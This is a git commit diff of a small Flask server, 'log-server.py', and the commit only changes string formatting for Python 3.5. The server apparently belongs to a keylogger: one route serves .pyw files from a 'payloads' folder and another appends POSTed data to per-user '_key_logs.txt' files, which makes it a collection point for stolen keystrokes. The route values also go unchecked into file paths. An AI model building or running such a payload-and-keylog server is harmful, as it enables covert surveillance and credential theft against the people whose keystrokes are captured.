bce18fd1d9ab4b00d55b55a0c5061a9564363040
Nibba2018 <sohambiswas41@gmail.com>
2020-09-16 01:28:31 +0530

    making string compatible with py 3.5

--- Raspberry Pi/log-server.py
+++ Raspberry Pi/log-server.py
@@ -3,14 +3,14 @@ app = Flask(__name__)
 
 @app.route('/<payload>', methods = ['GET'])
 def get_payloads(payload):
-    with open(f'payloads/{payload}.pyw', 'r') as f:
+    with open(f'payloads/%s.pyw' % (payload), 'r') as f:
         return f.read()
 
 
 @app.route('/log/<user>', methods = ['POST'])
 def upload_file(user):
     if request.method == 'POST':
-        with open(f"{user}_key_logs.txt", "a") as f:
+        with open("%s_key_logs.txt" % (user), "a") as f:
             f.write(request.data.decode())
             f.write("\n" + "="*50 + "\n")
     return 'ok', 200
